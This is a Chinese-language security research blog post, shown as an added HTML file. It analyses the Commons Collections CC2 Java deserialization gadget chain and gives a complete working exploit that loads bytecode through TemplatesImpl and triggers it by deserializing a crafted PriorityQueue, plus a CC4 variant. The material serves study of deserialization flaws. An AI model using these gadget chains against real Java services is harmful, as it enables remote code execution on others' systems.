@@ -1,0 +1,871 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="John Doe">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="前言在前几条链子中我们都用到了ChainedTransformer这个类作为辅助来执行Transformer数组里面的方法，而在cc2中，我们将舍弃掉这个类及数组的使用 流程图整体来说跟cc4差不多，区别就是cc2没有用ChainedTransformer和Transformer数组，同时用InvokerTransformer代替了InstantiateTransformer 1234567Pri">
+<meta property="og:type" content="article">
+<meta property="og:title" content="CC2反序列化链分析">
+<meta property="og:url" content="http://example.com/2024/10/19/CC2/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="前言在前几条链子中我们都用到了ChainedTransformer这个类作为辅助来执行Transformer数组里面的方法，而在cc2中，我们将舍弃掉这个类及数组的使用 流程图整体来说跟cc4差不多，区别就是cc2没有用ChainedTransformer和Transformer数组，同时用InvokerTransformer代替了InstantiateTransformer 1234567Pri">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/images/2024/1733301706389-c0dcd45a-ace6-4546-a4c6-4ae143fca07d.png">
+<meta property="og:image" content="http://example.com/images/2024/1733302015742-077a166b-0efb-4400-8379-b4665bb38493.png">
+<meta property="og:image" content="http://example.com/images/2024/1733302106548-ce0bd89d-8c23-48dc-a054-adccc6097145.png">
+<meta property="og:image" content="http://example.com/images/2024/1733302719383-5fd9a3b9-1155-4fe9-b385-330d367e6900.png">
+<meta property="og:image" content="http://example.com/images/2024/1733302927693-c6c1fadf-dc85-4eba-b9f9-72c2efc70cba.png">
+<meta property="og:image" content="http://example.com/images/2024/1733303010889-7809c6d3-550e-417c-9f96-543b68738651.png">
+<meta property="og:image" content="http://example.com/images/2024/1733303104986-e173a010-ed74-4b81-9c0b-491ea3c221a9.png">
+<meta property="og:image" content="http://example.com/images/2024/1733303200971-fe831089-cc6d-4381-b1d6-78181d6d43e1.png">
+<meta property="og:image" content="http://example.com/images/2024/1733303377091-3ddcaa70-e73a-4c49-9a40-bea09ebf8c87.png">
+<meta property="og:image" content="http://example.com/images/2024/1733303988604-08f377a8-38ae-4f38-8d15-97841349700c.png">
+<meta property="og:image" content="http://example.com/images/2024/1733052326163-aa65ac66-378b-4788-a742-e5fe94e7627f.png">
+<meta property="article:published_time" content="2024-10-19T07:30:00.000Z">
+<meta property="article:modified_time" content="2026-03-18T01:53:22.023Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="安全研究">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://example.com/images/2024/1733301706389-c0dcd45a-ace6-4546-a4c6-4ae143fca07d.png">
+  
+  
+  
+  <title>CC2反序列化链分析 - Hexo</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.9","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"expand_all":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"openkounter":{"server_url":"https://open-kounter.mintimate.cn","path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Change</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content (desktop) -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+<!-- Mobile grid menu overlay -->
+<div id="mobile-grid-menu" class="d-lg-none">
+  <div class="mobile-grid-menu-inner">
+    <div class="container">
+      <div class="row">
+        
+          
+          
+          
+          
+            <div class="col-4 mobile-grid-cell">
+              <a href="/" target="_self">
+                <div class="mobile-grid-item">
+                  <i class="iconfont icon-home-fill"></i>
+                  <span>首页</span>
+                </div>
+              </a>
+            </div>
+          
+        
+          
+          
+          
+          
+            <div class="col-4 mobile-grid-cell">
+              <a href="/archives/" target="_self">
+                <div class="mobile-grid-item">
+                  <i class="iconfont icon-archive-fill"></i>
+                  <span>归档</span>
+                </div>
+              </a>
+            </div>
+          
+        
+          
+          
+          
+          
+            <div class="col-4 mobile-grid-cell">
+              <a href="/categories/" target="_self">
+                <div class="mobile-grid-item">
+                  <i class="iconfont icon-category-fill"></i>
+                  <span>分类</span>
+                </div>
+              </a>
+            </div>
+          
+        
+          
+          
+          
+          
+            <div class="col-4 mobile-grid-cell">
+              <a href="/tags/" target="_self">
+                <div class="mobile-grid-item">
+                  <i class="iconfont icon-tags-fill"></i>
+                  <span>标签</span>
+                </div>
+              </a>
+            </div>
+          
+        
+          
+          
+          
+          
+            <div class="col-4 mobile-grid-cell">
+              <a href="/about/" target="_self">
+                <div class="mobile-grid-item">
+                  <i class="iconfont icon-user-fill"></i>
+                  <span>关于</span>
+                </div>
+              </a>
+            </div>
+          
+        
+        
+          <div class="col-4 mobile-grid-cell" id="mobile-search-btn">
+            <a href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <div class="mobile-grid-item">
+                <i class="iconfont icon-search"></i>
+                <span>搜索</span>
+              </div>
+            </a>
+          </div>
+        
+        
+          <div class="col-4 mobile-grid-cell" id="mobile-color-toggle-btn"
+               data-label-light="开灯"
+               data-label-dark="关灯">
+            <a href="javascript:;" aria-label="Color Toggle">
+              <div class="mobile-grid-item">
+                <i class="iconfont icon-dark" id="mobile-color-toggle-icon"></i>
+                <span id="mobile-color-toggle-label">关灯</span>
+              </div>
+            </a>
+          </div>
+        
+      </div>
+    </div>
+  </div>
+</div>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="CC2反序列化链分析"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2024-10-19 15:30" pubdate>
+          2024年10月19日 下午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          6.1k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          51 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">CC2反序列化链分析</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>在前几条链子中我们都用到了ChainedTransformer这个类作为辅助来执行Transformer数组里面的方法，而在cc2中，我们将舍弃掉这个类及数组的使用</p>
+<h1 id="流程图"><a href="#流程图" class="headerlink" title="流程图"></a>流程图</h1><p>整体来说跟cc4差不多，区别就是cc2没有用ChainedTransformer和Transformer数组，同时用InvokerTransformer代替了InstantiateTransformer</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs plain">PriorityQueue.readObject()<br>  PriorityQueue.heapify()<br>    PriorityQueue.siftDown()<br>      PriorityQueue.siftDownUsingComparator()<br>        TransformingComparator.compare()         <br>            InvokerTransformer.transform()<br>                    TemplatesImpl.newTransformer  <br></code></pre></td></tr></table></figure>
+
+<h1 id="链条分析"><a href="#链条分析" class="headerlink" title="链条分析"></a>链条分析</h1><p>一开始我其实有点懵，没想明白不使用ChainedTransformer的话该怎么传入TemplatesImpl的实例，因InvokerTransformer.transform(input)能调用input的任意方法，而在之前都是利用ChainedTransformer将Transformer数组中<code>上个类.transformer</code>的结果作为参数传给input的</p>
+<!-- 这是一张图片，ocr 内容为： PUBLIC 0 TRANSFORM(OBJECT INPUT) IF (INPUT ; NULT RETURN NULL; } ELSE TRY 4  CLASS<?> CLS : INPUT.GETCLASS(); METHOD METHOD CLS.GETMETHOD(THIS.IMETHODNAME, THIS.IPARAMTYPES); THIS.IARGS); RETURN METHOD.INVOKE(INPUT, -->
+<p><img src="/images/2024/1733301706389-c0dcd45a-ace6-4546-a4c6-4ae143fca07d.png" srcset="/img/loading.gif" lazyload></p>
+<p>不过现在我搞明白了，且听我一步步分析。</p>
+<p>还记得这两段代码的作用不，一开始我仅仅以为只是为了使size变大通过判断进入循环的</p>
+<!-- 这是一张图片，ocr 内容为：E:2); PRIORITYQUEUE.OFFER( E: 1); PRIORITYQUEUE.OFFER( -->
+<p><img src="/images/2024/1733302015742-077a166b-0efb-4400-8379-b4665bb38493.png" srcset="/img/loading.gif" lazyload></p>
+<!-- 这是一张图片，ocr 内容为：733 /UNCHECKED/  PRIVATE VOID HEAPIFY() { 734 >> 1) - 1; I >: 0; I---) FOR (INT 1 SIZE: 735 (E) SIFTDOWN(I QUEVE[I]); 737 -->
+<p><img src="/images/2024/1733302106548-ce0bd89d-8c23-48dc-a054-adccc6097145.png" srcset="/img/loading.gif" lazyload></p>
+<p>但其实不然在调用compare方法时会进行传参，参数是队列里的值，也就是offer传入队列的e，因为compare是比较队列中两个节点的大小，因此这也就是为什么前面heapify那里会要切队列中节点个数大于2了</p>
+<!-- 这是一张图片，ocr 内容为：I SIFTDOWNUSINGCOMPARATOR(INT K, E PRIVATE VOID SI  INT HALF 三 SIZE > 1  WHILE (K < HALF) {  INT CHILD : (K < 1) + 1;  OBJECT C 三 QUEVE[CHILD]; INT RIGHT CHILD  IF (RIGHT < SIZE & COMPARATOR.CPMPARE((E) C, (E) QUEVE[RIGHT]) > 0) QUEVELCHILD ; RIGHT]; IF (COMPARATOR.COMPARE(X, (E) C) <三 0) -->
+<p><img src="/images/2024/1733302719383-5fd9a3b9-1155-4fe9-b385-330d367e6900.png" srcset="/img/loading.gif" lazyload></p>
+<p>接着走到了TransformingComparator.compare()，可以看见调用transform方法时是由传参的，传参这是队列里的参数</p>
+<!-- 这是一张图片，ocr 内容为：PUBLIC INT COMPARE(I OBJ1, I OBJ2) { VALUE1 : THIS.TRANSFORMER.TRANSFORM(OBJ1); 0 VALUE2 - THIS.TRANSFORMER.TRANSFORM(OBJ2); -->
+<p><img src="/images/2024/1733302927693-c6c1fadf-dc85-4eba-b9f9-72c2efc70cba.png" srcset="/img/loading.gif" lazyload></p>
+<p>因此，思路就明了了，我们将TemplatesImpl的实例放到队列里，compare方法就会将实例作为参数放到transform方法的传参里</p>
+<!-- 这是一张图片，ocr 内容为：TEMPLATES); PRIORITYOUEUE.OFFER(TER E: 1); PRIORITYOUEUE OFFER -->
+<p><img src="/images/2024/1733303010889-7809c6d3-550e-417c-9f96-543b68738651.png" srcset="/img/loading.gif" lazyload></p>
+<!-- 这是一张图片，ocr 内容为：OBJ1: 1 OBJ1, I OBJ2){ PUBLIC INT OBJ2: TEMPLATESIMPL0624 COMPARE OBJ1: 1            CONSTANTTRANSFORMER@622 THIS.TRANSFORMER.TRANSFORM(OBJ1); VALUE1 THIS.TRANSFORMER.TRANSFORM(OBJ2); VALUE2 THIS.DECORATED.COMPARE(VALUEL, VALUE2); RETURN -->
+<p><img src="/images/2024/1733303104986-e173a010-ed74-4b81-9c0b-491ea3c221a9.png" srcset="/img/loading.gif" lazyload></p>
+<p>这样我们便实现了不依赖ChainedTransformer而进行命令执行</p>
+<!-- 这是一张图片，ocr 内容为：X 0 S 版本控制 CC2* JAVA反序列化 疗 CC1LAZYMAPJAVA TEMPLATESIMPLJAVA CC1TRANSFORMEDMAPJAV INWOKERTRANSFONMER.DASS 项目 CC2,JAVA TRANSFOMINGCOMPARATOR.CLASS LSRC ORG.APACHE.COMNONS.COLLECTIONS4.FUNCTORS.INVOKERTRANSFORNER; 13 R 口MAIN 目 JAVAX.XML.TRANSFORM.TEMPLATES, 15 BCC JAVAX.XML.TRANSFORN.TRANSFORMERCONFIGURATIONEXCEPTION; X 计算器 M O CALC IMPORT JAVA.10. G.REFLECT.FIELD; JAVA.LANG.R CCILAZYMAP 标准男 G JAVA.NIO.FILE.FILES, IMPORT CCITRANSFORMEDMAP CC2 IMPORT JAVA.NIO.FILE.PATHS; CCC3 0 22 IMPORT JAVA.UTIL.COMPARATOR GCC4 23 JAVA.UTIL.PRIORITYQUEUE; IMPORT 粤CC6 MC O TEST MY MR MS M- 25  D PUBLIC CLASS CC2{ JAVABASIC 26 D PUBLIC STATIC VOID MAIN(STRING[) ARQS) THROWS NOSUCHFIELDEXCEPTION. NDEXCEPTION, 园 CE C TEMPLATESINPL TEMPLATES ; NEW TEMPLATESINPL(); URLDNS 28 CLASS TEMPLATESCLASS-TEMPLATES.GETCLASS(); CA RESOURCES 29 X2 口 TEST 小 //修改_NAME 结构 FIELD NANEFIELD:TEMPLATESCLASS.GETDECLAREDFIELD( NAME:'_NAME'); 7 9 X 8 NAMEFIELD.SETACCESSIBLE(TRUE); O CC2 NAMEFIELD.SET(TEMPLATES, "CH4NGE"); 5 6 4 SERIALIZELOBJECTL:VOID /修改.TFACTORY # UNSERIALIZE(STRING):OBJECT FIELD TFACTORYFIELD-TEMPLATESCLASS-GETDECLAREDFIELD( NAMEN .TFACTORY): 1 2 3  TFAPTAPUFIELD EATLEPAEEIHLAFTEL, CC2 4 :OC@ C FEO DAD1'99147TIDTJACHN'79747 10 个 AT CC.CC2.MAIN(CC2.JAVA:72) 沙 个车动动会 >CAUSED BY: JAVA.LANG.REFLECT.INVOCATIONTARGETEXCEPTION <4 个内WH> 凸 AT ORG,APACHO.COMMONS.COLLECTIONSA,FUNCTORS,INVOKERTRANSFORANSFORNER,TRANSFORA(INVOKERTRANSFORNER-J3 CAUSED BY: JAVA.LANG.NULLPOINTEREXCEPTION CREATE BREAKPOINT AF COM,SUN,ORG,APSEHS,30TAN;ZAN,ZAT3ON 3SUNT3AN3T3O333 AT COM,SUN.ORG:APACHE:XALAN,INTERNALYXSLTC,TRAX.TEMPLATESIATESIAPL,GETTRANSLETINSTANPLATESINPL-IAVA:4 AT COA.SUN-ORG,APACHO.XOLAN,INTERNALXSIATESITC.TRAX.TEMPLATESIATESIANSFOREER (TEAPLATESIATESIAXA;4B6) ...          ....    ........................                                                         进程已结束,现出代码为1 25:1(2539字符,62行接行符) (RLF UTF-8 DUNTITLED > SIC > MAIN > CC > CC > CC2 人英拼令QX 2024/12/4 -->
+<p><img src="/images/2024/1733303200971-fe831089-cc6d-4381-b1d6-78181d6d43e1.png" srcset="/img/loading.gif" lazyload></p>
+<h1 id="最终exp"><a href="#最终exp" class="headerlink" title="最终exp"></a>最终exp</h1><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CC2</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> NoSuchFieldException, IOException, IllegalAccessException, ClassNotFoundException, TransformerConfigurationException &#123;<br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        Class templatesClass=templates.getClass();<br><br>        <span class="hljs-comment">//修改_name</span><br>        Field nameField=templatesClass.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);<br>        nameField.setAccessible(<span class="hljs-literal">true</span>);<br>        nameField.set(templates, <span class="hljs-string">&quot;Ch4nge&quot;</span>);<br><br>        <span class="hljs-comment">//修改_tfactory</span><br>        Field tfactoryField=templatesClass.getDeclaredField(<span class="hljs-string">&quot;_tfactory&quot;</span>);<br>        tfactoryField.setAccessible(<span class="hljs-literal">true</span>);<br>        tfactoryField.set(templates, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br><br>        <span class="hljs-comment">//往_bytecodes传入字节数组</span><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">bytecodesField</span> <span class="hljs-operator">=</span> templatesClass.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);<br>        <span class="hljs-type">byte</span>[]  bytecodes = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;E://Calc.class&quot;</span>));<br>        <span class="hljs-type">byte</span>[][] bytecodesArray = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]&#123;bytecodes&#125;;<br>        bytecodesField.setAccessible(<span class="hljs-literal">true</span>);<br>        bytecodesField.set(templates, bytecodesArray);<br><br>        <span class="hljs-comment">//调用方法</span><br>        <span class="hljs-comment">//templates.newTransformer();</span><br><br>        InstantiateTransformer instantiateTransformer=<span class="hljs-keyword">new</span> <span class="hljs-title class_">InstantiateTransformer</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Templates.class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;templates&#125;);<br>        <span class="hljs-comment">//instantiateTransformer.transform(TrAXFilter.class);</span><br><br>        InvokerTransformer invokerTransformer=<span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;newTransformer&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;&#125;);<br><br>        <span class="hljs-comment">//实例化TransformingComparator</span><br>        TransformingComparator transformingComparator=<span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformingComparator</span>&lt;&gt;(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>&lt;&gt;(<span class="hljs-number">1</span>));<br><br><br>        PriorityQueue priorityQueue=<span class="hljs-keyword">new</span> <span class="hljs-title class_">PriorityQueue</span>&lt;&gt;(transformingComparator);<br><br>        priorityQueue.offer(templates);<br>        priorityQueue.offer(<span class="hljs-number">1</span>);<br><br>        <span class="hljs-comment">//反射传入invokerTransformer</span><br>        Class TransformerClass=transformingComparator.getClass();<br>        Field sizeField=TransformerClass.getDeclaredField(<span class="hljs-string">&quot;transformer&quot;</span>);<br>        sizeField.setAccessible(<span class="hljs-literal">true</span>);<br>        sizeField.set(transformingComparator,invokerTransformer);<br><br>        <span class="hljs-comment">//        invokerTransformer.transform(templates);</span><br>        serialize(priorityQueue);<br>        unserialize(<span class="hljs-string">&quot;ser.bin&quot;</span>);<br><br><br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));<br>        oos.writeObject(obj);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String Filename)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException&#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(Filename));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> ois.readObject();<br>        <span class="hljs-keyword">return</span> obj;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure>
+
+<h1 id="另一种cc4"><a href="#另一种cc4" class="headerlink" title="另一种cc4"></a>另一种cc4</h1><p>在cc2中我们掌握了往transform传参的方法，以往都是要靠ChainedTransformer类的</p>
+<p>回到cc4，观察Transformer数组的内容，结合ChainedTransformer，无非就是想往InstantiateTransformer.transform传入TrAXFilter的实例</p>
+<!-- 这是一张图片，ocr 内容为：TRANSFORMER[]  TRANSFORMERS - NEW TRANSFORMER[]{ NEW CONSTANTTRANSFORMER(TRAXFILTER.CLASS), INSTANTIATETRANSFORMER, CHAINEDTRANSFORMER CHAINEDTRANSFORMER ; NEW CHAINEDTRANSFORMER(TRANSFORMERS); OMINACOMNANATON -->
+<p><img src="/images/2024/1733303377091-3ddcaa70-e73a-4c49-9a40-bea09ebf8c87.png" srcset="/img/loading.gif" lazyload></p>
+<p>我们利用上面的方法，同样能实现不不依赖ChainedTransformer而执行加载字节码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plain">priorityQueue.offer(TrAXFilter.class);<br>priorityQueue.offer(1);<br></code></pre></td></tr></table></figure>
+
+<!-- 这是一张图片，ocr 内容为：PUBLIC CLASS CC4 { 24 1214 OWS NOSUCHFIELDEXCEPTION, IOEXCEPTION, ILLEGALACCESSEXCEPTION, CLASSNOTFOUNDEXCEPTION, PUBLIC STATIC VOID MAIN(STRING[] ARGS) THROWS 25 //  INSTANTIATETRANSFORMER, 54 子: 55 CHAINEDTRANSFORMER CHAINEDTRANSFORMER - NEW CHAINEDTRANSFORMER(TRANSFORMERS); 56 计算器 57 三 标准 //实例化TRANSFORMINGCOMPARATOR 58 TRANSFORMINGCOMPARATOR TRANSFORMINGCOMPARATORENEW TRANSFORMINGCOMPARATOR<>(NEW CONSTANSTANT 59 60 0 61 62 SEUE<>(TRANSFORMINGCOMPARATOR); PRIORITYQUEUE PRIORITYQUEUENEW PRIORITYQUEUE<>(TN 63 64 MS ML MR MC M+ M- PRIORITYQUEUE.OFFER(TRAXFILTER.CLASS); 65 1); 66 PRIORITYQUEUE.OFFER C % CE 67 68 //反射传入CHA1NEDLRANSTORMER X.2 X CLASS TRANSFORMERCLASS-TRANSFORMINGCOMPARATOR.GETCLASS(); 69 FIELD SIZEFIELD:TRANSFORMERCLASS.GETDECLAREDFIELD( NAME: "TRANSFORMER"); 70 7 8 9  SIZEFIELD.SETACCESSIBLE(TRUE); 71 72 //将CHAINEDTRANSFORMER换成INSTANTIATETRANSFORMER INSTANTIATETRANSFORMER); SIZEFIELD.SET(TRANSFORMINGCOMPARATON 73 5 6 4 74 75 2 1 3 SERIALIZE(PRIORITYQUEUE); 76 UNSERIALIZE( FILENAME: "SER.BIN"); 77 78 -+ 0 79 80  PUBLIC STATIC VOID ALIZE(OBJECT OBJ) THROWS IOEXCEPTION{1个用法 81 SERIALI W OHIECTOUTNUTSTREAM(NEW FILENUTNUTNUTSTREAM( NAME U SEN HINUL) 82 OHIECTOUTNUTSTPEAM -->
+<p><img src="/images/2024/1733303988604-08f377a8-38ae-4f38-8d15-97841349700c.png" srcset="/img/loading.gif" lazyload></p>
+<p>这也解释了为什么这张图中cc4没有经过ChainedTransformer类，可能这才是真正的cc4吧</p>
+<!-- 这是一张图片，ocr 内容为： -->
